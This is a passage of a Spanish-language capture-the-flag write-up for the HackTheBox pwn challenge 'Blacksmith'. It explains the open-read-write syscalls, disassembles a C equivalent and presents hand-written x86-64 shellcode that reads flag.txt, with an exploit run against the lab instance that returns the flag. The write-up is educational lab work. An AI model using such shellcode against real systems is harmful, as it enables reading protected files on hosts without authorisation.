class="mtk1">, </span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk9 mtki">flags</span><span class="mtk1">);</span>  
</code></pre></div><p>Una vez que tengamos <code>sys_open</code> configurado, recibiremos el descriptor de archivo del archivo de la <em>flag</em> como valor de retorno en <code>$rax</code>. Aqu√≠ ser√° cuando usemos <code>sys_read</code>:</p><ul><li><code>$rax = 0</code></li><li><code>$rdi</code> tiene el descriptor de archivo (el que devuelve <code>sys_open</code>)</li><li><code>$rsi</code> tiene la direcci√≥n en la que se guardar√°n los contenidos le√≠dos</li><li><code>$rdx</code> tiene el n√∫mero de bytes a leer (por ejemplo, <code>100</code>)</li></ul><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">ssize_t</span><span class="mtk1"> </span><span class="mtk8">read</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk9 mtki">fd</span><span class="mtk1">, </span><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk9 mtki">buf</span><span class="mtk1">, </span><span class="mtk7 mtki">size_t</span><span class="mtk1"> </span><span class="mtk9 mtki">count</span><span class="mtk1">);</span>  
</code></pre></div><p>Finalmente, escribiremos el contenido a <code>stdout</code> mediante <code>sys_write</code>:</p><ul><li><code>$rax = 1</code></li><li><code>$rdi</code> tiene el descriptor de archivo (<code>1</code> para <code>stdout</code>)</li><li><code>$rsi</code> tiene la direcci√≥n desde la que se coger√°n los contenidos a escribir</li><li><code>$rdx</code> tiene el n√∫mero de bytes a escribir (por ejemplo, <code>100</code>)</li></ul><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">ssize_t</span><span class="mtk1"> </span><span class="mtk8">write</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk9 mtki">fd</span><span class="mtk1">, </span><span class="mtk5">const</span><span class="mtk1"> </span><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk9 mtki">buf</span><span class="mtk1">, </span><span class="mtk7 mtki">size_t</span><span class="mtk1"> </span><span class="mtk9 mtki">count</span><span class="mtk1">);</span>  
</code></pre></div><p>Para gente que nunca ha escrito en ensamblador, puede ser √∫til escribir un programa en C con la configuraci√≥n anterior, compilarlo y analizar el c√≥digo ensamblador generado:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">#include</span><span class="mtk1"> </span><span class="mtk4">&lt;fcntl.h&gt;</span>
<span class="mtk5">#include</span><span class="mtk1"> </span><span class="mtk4">&lt;stdlib.h&gt;</span>
<span class="mtk5">#include</span><span class="mtk1"> </span><span class="mtk4">&lt;unistd.h&gt;</span>

<span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">() {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> fd;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> data[</span><span class="mtk6">256</span><span class="mtk1">];</span>

<span class="mtk1">  fd </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">open</span><span class="mtk1">(</span><span class="mtk4">"./flag.txt"</span><span class="mtk1">, O_RDONLY);</span>  
<span class="mtk1">  </span><span class="mtk8">read</span><span class="mtk1">(fd, data, </span><span class="mtk6">100</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">write</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">, data, </span><span class="mtk6">100</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">);</span>
<span class="mtk1">}</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gcc</span> <span class="mtku">test.c</span> -O3 -o test
<span class="code-white">test.c:</span> In function ‚Äò<span class="code-white">main</span>‚Äô:
<span class="code-white">test.c:10:2:</span> <span class="code-magenta">warning: </span>ignoring return value of ‚Äò<span class="code-white">read</span>‚Äô, declared with attribute warn_unused_result [<span class="code-magenta">-Wunused-result</span>]
   10 |  <span class="code-magenta">read(fd, data, 100)</span>;
      |  <span class="code-magenta">^~~~~~~~~~~~~~~~~~~</span>
<span class="code-white">test.c:11:2:</span> <span class="code-magenta">warning: </span>ignoring return value of ‚Äò<span class="code-white">write</span>‚Äô, declared with attribute warn_unused_result [<span class="code-magenta">-Wunused-result</span>]  
   11 |  <span class="code-magenta">write(1, data, 100)</span>;
      |  <span class="code-magenta">^~~~~~~~~~~~~~~~~~~</span>

<span class="code-cyan">$</span> <span class="code-dark-green">./test</span>
HTB{f4k3_fl4g_f0r_t3st1ng}
</code></pre></div><p>Ese es el c√≥digo ensamblador generado (optimizado debido a la opci√≥n <code>-O3</code> de <code>gcc</code>). Este <em>shellcode</em> se conoce con el nombre de <em>open-read-write</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">objdump</span> -M intel --disassemble=main <span class="mtku">test</span>

test:     file format elf64-x86-64


Disassembly of section .init:

Disassembly of section .plt:

Disassembly of section .plt.got:

Disassembly of section .plt.sec:

Disassembly of section .text:

00000000000010c0 &lt;main&gt;:
    10c0:       f3 0f 1e fa             endbr64
    10c4:       55                      push   rbp
    10c5:       31 f6                   xor    esi,esi
    10c7:       48 8d 3d 36 0f 00 00    lea    rdi,[rip+0xf36]        # 2004 &lt;_IO_stdin_used+0x4&gt;  
    10ce:       48 81 ec 10 01 00 00    sub    rsp,0x110
    10d5:       64 48 8b 04 25 28 00    mov    rax,QWORD PTR fs:0x28
    10dc:       00 00
    10de:       48 89 84 24 08 01 00    mov    QWORD PTR [rsp+0x108],rax
    10e5:       00
    10e6:       31 c0                   xor    eax,eax
    10e8:       48 89 e5                mov    rbp,rsp
    10eb:       e8 b0 ff ff ff          call   10a0 &lt;open@plt&gt;
    10f0:       ba 64 00 00 00          mov    edx,0x64
    10f5:       48 89 ee                mov    rsi,rbp
    10f8:       89 c7                   mov    edi,eax
    10fa:       e8 91 ff ff ff          call   1090 &lt;read@plt&gt;
    10ff:       bf 01 00 00 00          mov    edi,0x1
    1104:       ba 64 00 00 00          mov    edx,0x64
    1109:       48 89 ee                mov    rsi,rbp
    110c:       e8 6f ff ff ff          call   1080 &lt;write@plt&gt;
    1111:       31 ff                   xor    edi,edi
    1113:       e8 98 ff ff ff          call   10b0 &lt;exit@plt&gt;

Disassembly of section .fini:
</code></pre></div><p>Esto est√° bien, pero ahora hay que hacer lo mismo con instrucciones <code>syscall</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk8">push</span> <span class="mtk7">rsi</span>
<span class="mtk8">mov</span>  <span class="mtk7">rdi</span>, <span class="mtk4">'flag.txt'</span>  <span class="mtk3"># as hexadecimal number</span>  
<span class="mtk8">push</span> <span class="mtk7">rdi</span>
<span class="mtk8">mov</span>  <span class="mtk7">rdi</span>, <span class="mtk7">rsp</span>
<span class="mtk8">mov</span>   <span class="mtk7">al</span>, <span class="mtk6">2</span>
<span class="mtk8">syscall</span>

<span class="mtk8">mov</span>   <span class="mtk7">dl</span>, <span class="mtk6">0x64</span>
<span class="mtk8">mov</span>  <span class="mtk7">rsi</span>, <span class="mtk7">rsp</span>
<span class="mtk8">xor</span>  <span class="mtk7">edi</span>, <span class="mtk7">eax</span>
<span class="mtk8">xor</span>   <span class="mtk7">al</span>, <span class="mtk7">al</span>
<span class="mtk8">syscall</span>

<span class="mtk8">mov</span>   <span class="mtk7">al</span>, <span class="mtk6">1</span>
<span class="mtk8">mov</span>  <span class="mtk7">rdi</span>, <span class="mtk7">rax</span>
<span class="mtk8">syscall</span>

<span class="mtk8">mov</span>   <span class="mtk7">al</span>, <span class="mtk6">0x3c</span>
<span class="mtk8">syscall</span>
</code></pre></div><p>N√≥tese c√≥mo puse <code>$rdi</code> como puntero a <code>"flag.txt\0"</code>, y tambi√©n c√≥mo los registros para <code>sys_write</code> siguen configurados de la anterior instrucci√≥n <code>sys_read</code>. Tambi√©n, optimic√© el uso de los registros para que el <em>shellcode</em> generado fuera m√°s corto.</p><p>Si introducimos el <em>shellcode</em> anterior en el programa <code>blacksmith</code>, obtendremos la <em>flag</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 134.209.26.70:31965
[<span class="code-blue">*</span>] './blacksmith'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-green">Full RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-red">NX disabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
    RWX:      <span class="code-dark-red">Has RWX segments</span>
[<span class="code-green">+</span>] Opening connection to 134.209.26.70 on port 31965: Done  
[<span class="code-green">+</span>] HTB{s3cc0mp_1s_t00_s3cur3}
[<span class="code-blue">*</span>] Closed connection to 134.209.26.70 port 31965
</code></pre></div><p>El <em>exploit</em> completo se puede encontrar aqu√≠: <a target="_blank" href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Challenges/Pwn/Blacksmith/solve.py"><code>solve.py</code></a>.</p><div class="mt6 instapaper_ignoref"></div></div></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter" target="popupwindow" onsubmit='return window.open("https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter"),!0'><h3 class="tc">7Rocky's Blog Weekly Newsletter</h3><p class="tc"><input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Recibe un resumen semanal del blog"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Suscribirse"><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">Ver historial de res√∫menes</a></p><p class="tc">impulsado por <a href="http://www.mailchimp.com" target="_blank" title="Mailchimp">Mailchimp</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; Blog de 7Rocky. Ciberseguridad y Mates 2024</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>